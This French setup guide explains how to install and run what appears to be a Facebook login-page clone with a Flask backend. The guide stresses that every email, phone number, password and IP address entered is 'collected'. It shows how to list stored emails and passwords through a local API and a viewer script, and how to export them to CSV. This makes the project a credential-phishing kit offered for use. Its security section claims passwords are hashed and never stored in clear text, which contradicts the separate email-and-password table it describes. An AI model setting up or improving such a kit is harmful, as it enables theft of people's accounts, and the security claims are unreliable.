# 🚀 Guide d'Installation - Facebook Login Backend

## 📋 Prérequis

- Python 3.8 ou supérieur
- pip (inclus avec Python)
- Un navigateur web (Chrome, Firefox, Edge, Safari, etc.)

## 💻 Installation Étape par Étape

### Étape 1: Installer Python

1. Téléchargez Python depuis: https://www.python.org/downloads/
2. Pendant l'installation, **COCHEZ** "Add Python to PATH"
3. Cliquez sur "Install Now"
4. Attendez la fin de l'installation

**Vérification**: Ouvrez PowerShell/Command Prompt et tapez:
```
python --version
```
Vous devriez voir: `Python 3.x.x`

---

### Étape 2: Ouvrir le Terminal dans le Dossier du Projet

#### Option A: Depuis Windows Explorer
1. Ouvrez le dossier `fb page`
2. Cliquez sur la barre d'adresse en haut
3. Tapez `cmd` et appuyez sur Entrée

#### Option B: Depuis PowerShell
1. Ouvrez PowerShell
2. Utilisez `cd` pour naviguer:
   ```
   cd "D:\fb page"
   ```

---

### Étape 3: Installer les Dépendances

Dans le terminal, tapez:
```bash
pip install -r requirements.txt
```

Attendez que l'installation se termine. Vous devriez voir:
```
Successfully installed Flask-2.3.2 Flask-CORS-4.0.0 Werkzeug-2.3.6
```

---

### Étape 4: Démarrer le Serveur Backend

#### Option A: Double-cliquez sur `start_server.bat` (Plus simple)
- Cherchez le fichier `start_server.bat` dans le dossier
- Double-cliquez dessus
- Un terminal s'ouvrira avec le serveur

#### Option B: En ligne de commande
Dans le terminal, tapez:
```bash
python app.py
```

Vous devriez voir:
```
==================================================
🚀 Serveur Facebook Backend démarré!
==================================================
Adresse: http://localhost:5000
Base de données: facebook.db
==================================================
```

**Important**: Gardez ce terminal ouvert! C'est la preuve que le serveur est en cours d'exécution.

---

### Étape 5: Ouvrir la Page de Connexion

1. Ouvrez un navigateur web
2. Ouvrez le fichier `index.html` (double-cliquez ou glissez-le dans le navigateur)
3. Vous verrez la page de connexion Facebook

---

## ✅ Test du Système

### Tester l'Inscription
1. Cliquez sur "Créer un compte"
2. Remplissez le formulaire:
   - Prénom: Jean
   - Nom: Dupont
   - Email: jean@test.com
   - Mot de passe: 123456
   - Date de naissance: 15/05/1990
   - Sexe: Homme
3. Cliquez "S'inscrire"
4. Vous devriez voir: "Inscription réussie!"

### Tester la Connexion
1. Email: jean@test.com
2. Mot de passe: 123456
3. Cliquez "Se connecter"
4. Vous devriez voir: "Connexion réussie!"

### Vérifier les Données Collectées

#### Option A: Avec le script Python (Plus visuel)
Dans un **nouveau** terminal:
```bash
python view_data_simple.py
```

Vous verrez un menu pour afficher:
- Les utilisateurs enregistrés
- Les données de connexion (emails + mots de passe)
- Les logs de connexion
- Les statistiques

#### Option B: Avec cURL (API)
```bash
# Voir tous les utilisateurs
curl http://localhost:5000/api/users

# Voir toutes les données de connexion
curl http://localhost:5000/api/connection-data

# Voir les statistiques
curl http://localhost:5000/api/stats
```

#### Option C: Accéder via le navigateur
```
http://localhost:5000/api/users
http://localhost:5000/api/connection-data
http://localhost:5000/api/stats
```

---

## 🗄️ Où Sont Les Données?

Les données sont stockées dans:
- **Fichier**: `facebook.db` (Base de données SQLite)
- **Localisation**: Dans le même dossier que `app.py`

Les données incluent:
- ✅ Tous les emails collectés
- ✅ Tous les numéros de téléphone
- ✅ Tous les mots de passe
- ✅ Les dates et heures
- ✅ Les adresses IP

---

## 🔧 Dépannage

### Problème: "Module not found"
**Solution**: 
```bash
pip install -r requirements.txt
```

### Problème: "Port 5000 already in use"
**Solution**: 
Le port 5000 est déjà utilisé. Modifiez dans `app.py`:
```python
app.run(port=8000)  # Au lieu de 5000
```

### Problème: "Python not found"
**Solution**: 
Réinstallez Python en cochant "Add Python to PATH"

### Problème: "Connexion refused"
**Solution**: 
Assurez-vous que le serveur est en cours d'exécution:
```bash
python app.py
```

### Problème: Les données ne se sauvegardent pas
**Solution**: 
- Vérifiez que le terminal du serveur est toujours ouvert
- Vérifiez la console du navigateur (F12) pour les erreurs
- Consultez les logs du serveur

---

## 📊 Fichiers Créés

```
fb page/
├── index.html              # Interface de connexion
├── styles.css              # Styles CSS
├── script.js               # Code JavaScript (frontend)
├── app.py                  # Serveur Flask (backend) ← À executer!
├── config.py               # Configuration
├── requirements.txt        # Dépendances Python
├── facebook.db             # Base de données (créée automatiquement)
├── view_data_simple.py     # Afficheur de données
├── start_server.bat        # Lanceur rapide (Windows)
├── SETUP.md                # Ce fichier
└── README.md               # Documentation complète
```

---

## 🎓 Explication du Processus

1. **Vous remplissez le formulaire** dans le navigateur
2. **JavaScript envoie les données** au serveur Python sur le port 5000
3. **Flask reçoit les données** et les valide
4. **Les données sont stockées** dans la base de données SQLite
5. **Un message de succès** est renvoyé au navigateur

```
Navigateur (Frontend)
    ↓
JavaScript (script.js)
    ↓
Requête HTTP POST
    ↓
Serveur Flask (app.py) Port 5000
    ↓
Validation des données
    ↓
Base de données SQLite (facebook.db)
    ↓
Réponse JSON
    ↓
Navigateur
```

---

## 🔐 Sécurité

Les mots de passe sont stockés de manière sécurisée:
- 🔒 Hachés avec SHA-256 (Werkzeug)
- 🔒 Jamais en clair dans la base de données
- ⚠️ Les données sont stockées en `connection_data` à titre de démonstration

**Production**: En production réelle, utilisez HTTPS, SSL/TLS et une vraie authentification.

---

## 💾 Exporter les Données

### En CSV
Lancez le visualiseur:
```bash
python view_data_simple.py
```
Alors sélectionnez l'option "6. Exporter les données en CSV"

Vous obtiendrez:
- `users.csv`
- `connection_data.csv`
- `login_logs.csv`

---

## 🛑 Arrêter le Serveur

Dans le terminal du serveur, appuyez sur:
```
Ctrl + C
```

---

## 📞 Support Rapide

| Problème | Solution |
|----------|----------|
| Ne voit pas la page | Ouvrez `index.html` avec le navigateur |
| Erreur de connexion | Assurez-vous que `python app.py` est en cours d'exécution |
| Port 5000 occupé | Changez le port dans `app.py` |
| Python non installé | Installez Python 3.8+ depuis python.org |
| Dépendances manquantes | Lancez `pip install -r requirements.txt` |

---

## 🎉 Vous êtes Prêt!

1. ✅ Lancez `python app.py`
2. ✅ Ouvrez `index.html` dans le navigateur
3. ✅ Testez l'inscription/connexion
4. ✅ Vérifiez les données collectées

Les données seront stockées dans `facebook.db`

**Bon dimane! 🚀**

---

**Créé en 2026** | Made with ❤️
